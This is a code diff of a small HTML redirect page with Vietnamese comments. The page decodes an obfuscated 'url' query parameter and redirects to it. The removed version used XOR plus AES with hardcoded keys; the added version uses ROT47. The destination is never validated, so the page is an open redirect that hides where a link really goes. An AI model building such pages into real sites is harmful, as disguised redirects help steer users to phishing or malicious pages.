@@ -2,37 +2,33 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Resource Loader</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <title>Redirecting...</title>
 </head>
 <body>
-    <p>Loading resource...</p>
+    <p>Redirecting to your destination...</p>
     <script>
-        function x(s, k) {
-            let r = "";
-            for (let i = 0; i < s.length; i++) {
-                r += String.fromCharCode(s.charCodeAt(i) ^ k.charCodeAt(i % k.length));
+        function rot47Decode(str) {
+            let decoded = '';
+            for (let i = 0; i < str.length; i++) {
+                let charCode = str.charCodeAt(i);
+                if (charCode >= 33 && charCode <= 126) {
+                    decoded += String.fromCharCode((charCode - 33 - 47 + 94) % 94 + 33);
+                } else {
+                    decoded += str[i];
+                }
             }
-            return r;
+            return decoded;
         }
 
-        const p = new URLSearchParams(window.location.search);
-        const e = p.get("data");
+        // Lấy tham số 'url' từ query string
+        const urlParams = new URLSearchParams(window.location.search);
+        const encodedUrl = urlParams.get('url') || ''; // Chuỗi mã hóa từ URL
 
-        if (e) {
-            const xk = "RandomXOR123"; // Khóa XOR ẩn trong mã
-            const ak = "SuperSecretKey2025"; // Khóa AES ẩn trong mã
-            try {
-                const d1 = x(atob(e), xk); // Giải XOR
-                const d2 = CryptoJS.AES.decrypt(d1, ak).toString(CryptoJS.enc.Utf8); // Giải AES
-                if (d2) window.location.href = d2;
-                else document.body.innerHTML = "Invalid resource!";
-            } catch (err) {
-                document.body.innerHTML = "Error loading resource!";
-            }
+        if (encodedUrl) {
+            const decodedUrl = rot47Decode(encodedUrl); // Giải mã ROT47
+            window.location.href = decodedUrl; // Chuyển hướng
         } else {
-            document.body.innerHTML = "No resource specified!";
+            document.body.innerHTML = "<p>Error: No URL provided.</p>";
         }
     </script>
 </body>
